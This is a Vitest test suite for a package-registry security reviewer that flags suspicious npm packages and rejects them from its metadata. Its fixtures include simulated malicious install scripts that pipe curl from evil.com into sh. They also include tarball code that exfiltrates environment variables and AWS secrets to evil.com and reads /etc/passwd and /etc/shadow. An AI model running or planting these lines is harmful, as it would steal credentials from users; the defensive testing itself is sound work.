import {
	describe,
	it,
	expect,
	beforeAll,
	afterEach,
	vi,
} from "vitest";
import { env, exports } from "cloudflare:workers";
import { analyzePackage } from "../review/analyze.js";
import { processReviewInline } from "../review/consumer.js";
import {
	runMigrations,
	createPackage,
	createPackageVersion,
	makeNpmMetadata,
} from "./helpers.js";

const BASE = "https://registry.test";

function workerFetch(path: string, init?: RequestInit) {
	return exports.default.fetch(new Request(`${BASE}${path}`, init));
}

// ─── Tarball builder ────────────────────────────────────────────────
// Builds a minimal valid .tgz in-memory that the Worker's tar parser
// can extract. The parser doesn't verify checksums so we can skip that.

function buildTarEntry(filePath: string, content: string): Uint8Array {
	const encoder = new TextEncoder();
	const contentBytes = encoder.encode(content);
	const fileSize = contentBytes.length;
	const paddedSize = Math.ceil(fileSize / 512) * 512 || 512;

	const header = new Uint8Array(512);

	const nameStr = `package/${filePath}`;
	header.set(encoder.encode(nameStr).subarray(0, 99), 0);

	const sizeStr = fileSize.toString(8).padStart(11, "0");
	header.set(encoder.encode(sizeStr), 124);
	header[135] = 0;

	header[156] = 48; // '0' — regular file

	const entry = new Uint8Array(512 + paddedSize);
	entry.set(header, 0);
	entry.set(contentBytes, 512);
	return entry;
}

function buildTar(files: { path: string; content: string }[]): Uint8Array {
	const entries = files.map((f) => buildTarEntry(f.path, f.content));
	const endBlock = new Uint8Array(1024);
	const totalSize =
		entries.reduce((sum, e) => sum + e.length, 0) + endBlock.length;
	const tar = new Uint8Array(totalSize);
	let offset = 0;
	for (const entry of entries) {
		tar.set(entry, offset);
		offset += entry.length;
	}
	return tar;
}

async function buildTarGz(
	files: { path: string; content: string }[],
): Promise<Uint8Array> {
	const tar = buildTar(files);
	const compressed = new Blob([tar])
		.stream()
		.pipeThrough(new CompressionStream("gzip"));
	return new Uint8Array(await new Response(compressed).arrayBuffer());
}

// ─── Fetch mock ─────────────────────────────────────────────────────

type MockEntry =
	| { status: number; json: any }
	| { status: number; buffer: Uint8Array };

/**
 * AI SDK v4 uses the OpenAI Responses API (/responses) by default.
 * generateObject with a schema sends structured output instructions
 * and expects the result as text content in the response output.
 */
function makeAiResponse(riskScore: number, summary: string, findings: any[] = []) {
	const resultObj = { riskScore, findings, summary };
	return {
		id: "resp_test_001",
		object: "response",
		created_at: Math.floor(Date.now() / 1000),
		status: "completed",
		model: "moonshotai/kimi-k2.5",
		output: [
			{
				type: "message",
				id: "msg_test_001",
				status: "completed",
				role: "assistant",
				content: [
					{
						type: "output_text",
						text: JSON.stringify(resultObj),
						annotations: [],
					},
				],
			},
		],
		usage: {
			input_tokens: 100,
			output_tokens: 50,
			total_tokens: 150,
		},
	};
}

function mockFetchFor(
	mocks: Map<string, MockEntry>,
	aiOverride?: { riskScore: number; summary: string; findings?: any[] },
) {
	const aiRes = aiOverride ?? {
		riskScore: 0.15,
		summary: "Package appears safe based on analysis.",
	};
	return vi
		.spyOn(globalThis, "fetch")
		.mockImplementation(async (input, init) => {
			const request = new Request(input as any, init);
			const url = new URL(request.url);
			const key = `${url.origin}${url.pathname}`;

			if (url.origin === "https://openrouter.ai") {
				return new Response(
					JSON.stringify(
						makeAiResponse(
							aiRes.riskScore,
							aiRes.summary,
							aiRes.findings ?? [],
						),
					),
					{
						status: 200,
						headers: { "content-type": "application/json" },
					},
				);
			}

			const mock = mocks.get(key);
			if (mock) {
				if ("buffer" in mock) {
					return new Response(mock.buffer, {
						status: mock.status,
						headers: {
							"content-type": "application/octet-stream",
							"content-length": String(mock.buffer.length),
						},
					});
				}
				return new Response(JSON.stringify(mock.json), {
					status: mock.status,
					headers: { "content-type": "application/json" },
				});
			}

			return new Response(JSON.stringify({ error: "not found" }), {
				status: 404,
			});
		});
}

function upstreamUrl(name: string) {
	return `https://registry.npmjs.org/${encodeURIComponent(name).replace("%40", "@")}`;
}

// ─── Setup ──────────────────────────────────────────────────────────

beforeAll(async () => {
	await runMigrations(env.DB);
});

afterEach(() => {
	vi.restoreAllMocks();
});

// ─── Tests ──────────────────────────────────────────────────────────

describe("analyzePackage — static analysis detections", () => {
	it("flags packages with install scripts", async () => {
		const metadata = {
			name: "evil-install",
			description: "test",
			versions: {
				"1.0.0": {
					name: "evil-install",
					version: "1.0.0",
					scripts: {
						postinstall: "curl https://evil.com/steal | sh",
						preinstall: "node exploit.js",
					},
					dist: { tarball: "https://registry.npmjs.org/evil-install/-/evil-install-1.0.0.tgz", shasum: "abc" },
					dependencies: {},
				},
			},
			"dist-tags": { latest: "1.0.0" },
			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
			maintainers: [{ name: "test" }],
		};

		mockFetchFor(
			new Map([
				[upstreamUrl("evil-install"), { status: 200, json: metadata }],
			]),
		);

		const result = await analyzePackage(env, "evil-install", "1.0.0");

		const installFindings = result.findings.filter(
			(f) => f.category === "install-scripts",
		);
		expect(installFindings.length).toBeGreaterThanOrEqual(2);
		expect(installFindings.some((f) => f.message.includes("postinstall"))).toBe(true);
		expect(installFindings.some((f) => f.message.includes("preinstall"))).toBe(true);
		expect(installFindings.every((f) => f.severity === "high")).toBe(true);
		expect(result.riskScore).toBeGreaterThan(0.2);
	});

	it("flags packages with obfuscated code in tarballs", async () => {
		const maliciousJs = [
			'const _0xabc123 = "test"; const _0xdef456 = _0xabc123;',
			'Buffer.from("' + "A".repeat(80) + '", "base64");',
			'eval("malicious" + ["code"].join(""));',
			"const x = require('child_process'); x.exec('whoami');",
			'process.env.SECRET; fetch("https://evil.com/exfil");',
		].join("\n");

		const tgz = await buildTarGz([
			{ path: "index.js", content: maliciousJs },
		]);

		const metadata = {
			name: "obfuscated-pkg",
			description: "Innocent looking package",
			versions: {
				"1.0.0": {
					name: "obfuscated-pkg",
					version: "1.0.0",
					dist: {
						tarball: "https://registry.npmjs.org/obfuscated-pkg/-/obfuscated-pkg-1.0.0.tgz",
						shasum: "abc",
					},
					dependencies: {},
				},
			},
			"dist-tags": { latest: "1.0.0" },
			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
			maintainers: [{ name: "test" }],
		};

		mockFetchFor(
			new Map<string, MockEntry>([
				[upstreamUrl("obfuscated-pkg"), { status: 200, json: metadata }],
				[
					"https://registry.npmjs.org/obfuscated-pkg/-/obfuscated-pkg-1.0.0.tgz",
					{ status: 200, buffer: tgz },
				],
			]),
		);

		const result = await analyzePackage(env, "obfuscated-pkg", "1.0.0");

		const obfuscationFindings = result.findings.filter(
			(f) => f.category === "obfuscation",
		);
		expect(obfuscationFindings.length).toBeGreaterThanOrEqual(3);

		const categories = obfuscationFindings.map((f) => f.message);
		expect(categories.some((m) => m.includes("_0x pattern"))).toBe(true);
		expect(categories.some((m) => m.includes("base64") || m.includes("Buffer.from"))).toBe(true);
		expect(categories.some((m) => m.includes("eval") || m.includes("child_process") || m.includes("process.env"))).toBe(true);

		expect(result.riskScore).toBeGreaterThan(0.4);
	});

	it("flags packages with no maintainers", async () => {
		const metadata = {
			name: "no-maint-pkg",
			description: "test",
			versions: {
				"1.0.0": {
					name: "no-maint-pkg",
					version: "1.0.0",
					dist: { tarball: "https://registry.npmjs.org/no-maint-pkg/-/no-maint-pkg-1.0.0.tgz", shasum: "x" },
					dependencies: {},
				},
			},
			"dist-tags": { latest: "1.0.0" },
			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
			maintainers: [],
		};

		mockFetchFor(
			new Map([
				[upstreamUrl("no-maint-pkg"), { status: 200, json: metadata }],
			]),
		);

		const result = await analyzePackage(env, "no-maint-pkg", "1.0.0");
		const finding = result.findings.find((f) => f.category === "no-maintainers");
		expect(finding).toBeTruthy();
		expect(finding!.severity).toBe("medium");
	});

	it("returns max risk score for nonexistent packages", async () => {
		mockFetchFor(new Map());

		const result = await analyzePackage(env, "this-does-not-exist-xyz", "1.0.0");
		expect(result.riskScore).toBe(1.0);
		expect(result.findings.some((f) => f.category === "existence")).toBe(true);
	});

	it("returns max risk score for nonexistent version", async () => {
		const metadata = {
			name: "real-pkg",
			versions: { "1.0.0": { dist: {} } },
			"dist-tags": { latest: "1.0.0" },
			time: { created: "2020-01-01T00:00:00Z" },
		};

		mockFetchFor(
			new Map([[upstreamUrl("real-pkg"), { status: 200, json: metadata }]]),
		);

		const result = await analyzePackage(env, "real-pkg", "9.9.9");
		expect(result.riskScore).toBe(1.0);
		expect(result.findings.some((f) => f.message.includes("9.9.9"))).toBe(true);
	});

	it("flags suspicious new dependencies with low downloads", async () => {
		const metadata = {
			name: "dep-test-pkg",
			description: "test",
			versions: {
				"1.0.0": {
					name: "dep-test-pkg",
					version: "1.0.0",
					dist: { tarball: "https://registry.npmjs.org/dep-test-pkg/-/dep-test-pkg-1.0.0.tgz", shasum: "x" },
					dependencies: { "shady-dep": "^1.0.0" },
				},
			},
			"dist-tags": { latest: "1.0.0" },
			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
			maintainers: [{ name: "test" }],
		};

		const shadyDepMeta = {
			name: "shady-dep",
			time: {
				created: new Date(Date.now() - 5 * 86_400_000).toISOString(),
			},
		};

		mockFetchFor(
			new Map<string, MockEntry>([
				[upstreamUrl("dep-test-pkg"), { status: 200, json: metadata }],
				[
					"https://api.npmjs.org/downloads/point/last-week/shady-dep",
					{ status: 200, json: { downloads: 12 } },
				],
				[upstreamUrl("shady-dep"), { status: 200, json: shadyDepMeta }],
			]),
		);

		const result = await analyzePackage(env, "dep-test-pkg", "1.0.0");

		const depFindings = result.findings.filter(
			(f) => f.category === "suspicious-new-dep",
		);
		expect(depFindings.length).toBeGreaterThanOrEqual(1);
		expect(depFindings.some((f) => f.message.includes("shady-dep"))).toBe(true);
	});
});

describe("processReviewInline — consumer pipeline", () => {
	it("auto-approves clean packages", async () => {
		const metadata = makeNpmMetadata("review-pipeline-pkg", ["1.0.0"]);
		mockFetchFor(
			new Map([
				[upstreamUrl("review-pipeline-pkg"), { status: 200, json: metadata }],
			]),
			{ riskScore: 0.05, summary: "Clean package, no issues." },
		);

		const pkgId = await createPackage(env.DB, {
			name: "review-pipeline-pkg",
			weeklyDownloads: 100_000,
		});
		const verId = await createPackageVersion(env.DB, {
			packageId: pkgId,
			version: "1.0.0",
			status: "pending",
		});

		await processReviewInline(env, {
			packageVersionId: verId,
			packageName: "review-pipeline-pkg",
			version: "1.0.0",
		});

		const review = await env.DB.prepare(
			"SELECT * FROM review WHERE package_version_id = ?",
		)
			.bind(verId)
			.first<any>();

		expect(review).toBeTruthy();
		expect(review.reviewer_type).toBe("ai");
		expect(review.risk_score).toBeTypeOf("number");
		expect(review.risk_score).toBeLessThanOrEqual(0.2);
		expect(review.status).toBe("approved");

		const version = await env.DB.prepare(
			"SELECT status FROM package_version WHERE id = ?",
		)
			.bind(verId)
			.first<{ status: string }>();

		expect(version!.status).toBe("approved");
	});

	it("auto-rejects high-risk packages and stores parseable findings", async () => {
		const maliciousCode = [
			'const _0xdead01 = process.env; _0xdead02 = _0xdead01;',
			'fetch("https://evil.com?" + JSON.stringify(process.env));',
			'eval("require" + "(\'child_process\').exec(\'id\')");',
			'Buffer.from("' + "Z".repeat(80) + '", "base64");',
		].join("\n");
		const tgz = await buildTarGz([
			{ path: "index.js", content: maliciousCode },
		]);

		const metadata = {
			name: "findings-json-pkg",
			description: "test",
			versions: {
				"1.0.0": {
					name: "findings-json-pkg",
					version: "1.0.0",
					scripts: {
						postinstall: "node index.js",
						preinstall: "curl https://evil.com | sh",
						install: "node exploit.js",
					},
					dist: { tarball: "https://registry.npmjs.org/findings-json-pkg/-/findings-json-pkg-1.0.0.tgz", shasum: "x" },
					dependencies: {},
				},
			},
			"dist-tags": { latest: "1.0.0" },
			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
			maintainers: [],
		};

		mockFetchFor(
			new Map<string, MockEntry>([
				[upstreamUrl("findings-json-pkg"), { status: 200, json: metadata }],
				[
					"https://registry.npmjs.org/findings-json-pkg/-/findings-json-pkg-1.0.0.tgz",
					{ status: 200, buffer: tgz },
				],
			]),
			{ riskScore: 1.0, summary: "Extremely malicious: data exfiltration and code execution." },
		);

		const pkgId = await createPackage(env.DB, {
			name: "findings-json-pkg",
			weeklyDownloads: 50_000,
		});
		const verId = await createPackageVersion(env.DB, {
			packageId: pkgId,
			version: "1.0.0",
			status: "pending",
		});

		await processReviewInline(env, {
			packageVersionId: verId,
			packageName: "findings-json-pkg",
			version: "1.0.0",
		});

		const review = await env.DB.prepare(
			"SELECT findings FROM review WHERE package_version_id = ?",
		)
			.bind(verId)
			.first<{ findings: string }>();

		const findings = JSON.parse(review!.findings);
		expect(Array.isArray(findings)).toBe(true);
		expect(findings.length).toBeGreaterThan(0);

		const installFinding = findings.find(
			(f: any) => f.category === "install-scripts",
		);
		expect(installFinding).toBeTruthy();
		expect(installFinding.severity).toBe("high");

		const version = await env.DB.prepare(
			"SELECT status FROM package_version WHERE id = ?",
		)
			.bind(verId)
			.first<{ status: string }>();

		expect(version!.status).toBe("rejected");
	});
});

describe("end-to-end — malicious package with obfuscated tarball", () => {
	it("reviews a package with malicious code and blocks it from metadata", async () => {
		const maliciousCode = [
			'const _0xbeef01 = require("child_process"); _0xbeef02 = _0xbeef01;',
			'_0xbeef01.exec("curl https://evil.com/$(cat /etc/passwd)");',
			'const secret = process.env.AWS_SECRET_KEY; fetch("https://evil.com/collect?key=" + secret);',
			'Buffer.from("' + "Q".repeat(100) + '", "base64");',
			'eval("require" + "(\'fs\').readFileSync" + "(\'/etc/shadow\')");',
		].join("\n");

		const tgz = await buildTarGz([
			{ path: "index.js", content: maliciousCode },
			{ path: "package.json", content: '{"name":"malware-sim","version":"2.0.0"}' },
		]);

		const metadata = {
			name: "malware-sim",
			description: "Totally legit utility",
			versions: {
				"1.0.0": {
					name: "malware-sim",
					version: "1.0.0",
					dist: {
						tarball: "https://registry.npmjs.org/malware-sim/-/malware-sim-1.0.0.tgz",
						shasum: "prev",
					},
					dependencies: {},
				},
				"2.0.0": {
					name: "malware-sim",
					version: "2.0.0",
					scripts: { postinstall: "node index.js" },
					dist: {
						tarball: "https://registry.npmjs.org/malware-sim/-/malware-sim-2.0.0.tgz",
						shasum: "curr",
					},
					dependencies: { "shady-exfil-lib": "^1.0.0" },
				},
			},
			"dist-tags": { latest: "2.0.0" },
			time: {
				created: "2024-01-01T00:00:00Z",
				"1.0.0": "2024-01-01T00:00:00Z",
				"2.0.0": "2024-06-15T00:00:00Z",
			},
			maintainers: [{ name: "attacker" }],
		};

		const aiResponse = {
			riskScore: 0.95,
			summary: "Almost certainly malicious: obfuscated exfiltration of env vars.",
			findings: [
				{ severity: "critical" as const, category: "ai-exfiltration", message: "Code exfiltrates process.env to external server" },
			],
		};

		mockFetchFor(
			new Map<string, MockEntry>([
				[upstreamUrl("malware-sim"), { status: 200, json: metadata }],
				[
					"https://registry.npmjs.org/malware-sim/-/malware-sim-2.0.0.tgz",
					{ status: 200, buffer: tgz },
				],
				[
					"https://api.npmjs.org/downloads/point/last-week/shady-exfil-lib",
					{ status: 200, json: { downloads: 3 } },
				],
				[
					upstreamUrl("shady-exfil-lib"),
					{
						status: 200,
						json: {
							name: "shady-exfil-lib",
							time: { created: new Date(Date.now() - 2 * 86_400_000).toISOString() },
						},
					},
				],
			]),
			aiResponse,
		);

		// ── Step 1: Run analysis directly to verify detections ──
		const analysis = await analyzePackage(env, "malware-sim", "2.0.0");

		expect(analysis.riskScore).toBeGreaterThan(0.8);

		const categories = new Set(analysis.findings.map((f) => f.category));
		expect(categories.has("install-scripts")).toBe(true);
		expect(categories.has("obfuscation")).toBe(true);
		expect(categories.has("suspicious-new-dep")).toBe(true);

		const criticalCount = analysis.findings.filter(
			(f) => f.severity === "critical",
		).length;
		const highCount = analysis.findings.filter(
			(f) => f.severity === "high",
		).length;
		expect(criticalCount + highCount).toBeGreaterThanOrEqual(4);

		// ── Step 2: Run the consumer pipeline ──
		mockFetchFor(
			new Map<string, MockEntry>([
				[upstreamUrl("malware-sim"), { status: 200, json: metadata }],
				[
					"https://registry.npmjs.org/malware-sim/-/malware-sim-2.0.0.tgz",
					{ status: 200, buffer: tgz },
				],
				[
					"https://api.npmjs.org/downloads/point/last-week/shady-exfil-lib",
					{ status: 200, json: { downloads: 3 } },
				],
				[
					upstreamUrl("shady-exfil-lib"),
					{
						status: 200,
						json: {
							name: "shady-exfil-lib",
							time: { created: new Date(Date.now() - 2 * 86_400_000).toISOString() },
						},
					},
				],
			]),
			aiResponse,
		);

		const pkgId = await createPackage(env.DB, {
			name: "malware-sim",
			weeklyDownloads: 300_000,
		});

		const ver1Id = await createPackageVersion(env.DB, {
			packageId: pkgId,
			version: "1.0.0",
			status: "approved",
		});

		const ver2Id = await createPackageVersion(env.DB, {
			packageId: pkgId,
			version: "2.0.0",
			status: "pending",
		});

		await processReviewInline(env, {
			packageVersionId: ver2Id,
			packageName: "malware-sim",
			version: "2.0.0",
		});

		// ── Step 3: Verify DB state ──
		const review = await env.DB.prepare(
			"SELECT * FROM review WHERE package_version_id = ?",
		)
			.bind(ver2Id)
			.first<any>();

		expect(review).toBeTruthy();
		expect(review.risk_score).toBeGreaterThanOrEqual(0.85);
		expect(review.status).toBe("rejected");

		const findings = JSON.parse(review.findings);
		expect(findings.some((f: any) => f.category === "obfuscation")).toBe(true);
		expect(findings.some((f: any) => f.category === "install-scripts")).toBe(true);
		expect(findings.some((f: any) => f.category === "ai-exfiltration")).toBe(true);

		const version = await env.DB.prepare(
			"SELECT status FROM package_version WHERE id = ?",
		)
			.bind(ver2Id)
			.first<{ status: string }>();

		expect(version!.status).toBe("rejected");

		// ── Step 4: Verify the metadata endpoint filters it ──
		// Re-mock for the metadata endpoint call
		mockFetchFor(
			new Map<string, MockEntry>([
				[upstreamUrl("malware-sim"), { status: 200, json: metadata }],
			]),
		);

		const metaRes = await workerFetch("/malware-sim");
		expect(metaRes.status).toBe(200);

		const metaBody = await metaRes.json<any>();

		// v1.0.0 is approved → visible
		expect(metaBody.versions["1.0.0"]).toBeTruthy();
		// v2.0.0 was auto-rejected → filtered out
		expect(metaBody.versions["2.0.0"]).toBeUndefined();
	});
});
